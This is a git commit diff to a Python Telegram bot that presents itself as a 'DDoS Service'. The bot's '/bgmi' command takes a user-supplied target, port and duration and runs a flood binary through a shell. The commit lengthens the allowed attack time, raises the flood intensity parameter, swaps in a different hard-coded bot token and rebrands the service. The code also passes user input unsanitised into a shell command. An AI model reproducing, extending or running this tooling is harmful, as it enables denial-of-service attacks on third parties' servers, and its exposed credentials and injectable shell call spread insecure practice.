4aaea5b11769d1ce2aa2769123ee9a8b1446e3d0
ankur1181 <ankurmoran615@gmail.com>
2025-04-02 17:46:50 +0530

    Update main.py

--- main.py
+++ main.py
@@ -6,7 +6,7 @@ import datetime
 import os
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7668634322:AAG9VeqvWU09XSQJLkPuQoBHdRCTSF25AVw')
+bot = telebot.TeleBot('7659548479:AAH1Fqrdot8aCWFpskc2xyoo8vDKZyondQg')
 
 # Admin user IDs
 admin_id = {"5666606072"}
@@ -230,13 +230,13 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 181:
-                response = "Error: Time interval must be less than 180."
+            if time > 240:
+                response = "Error: Time interval must be less than 240."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./soulcrack {target} {port} {time} 200"
+                full_command = f"./Alone {target} {port} {time} 1200"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
@@ -294,7 +294,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''👋🏻Welcome to Professor's DDoS Service DDoS Bot, {user_name}!\nFeel Free to Explore.
+    response = f'''👋🏻Welcome to ERRORX DDoS Service DDoS Bot, {user_name}!\nFeel Free to Explore.
 \n🤖Try To Run This Command : /help 
 '''
     bot.reply_to(message, response)
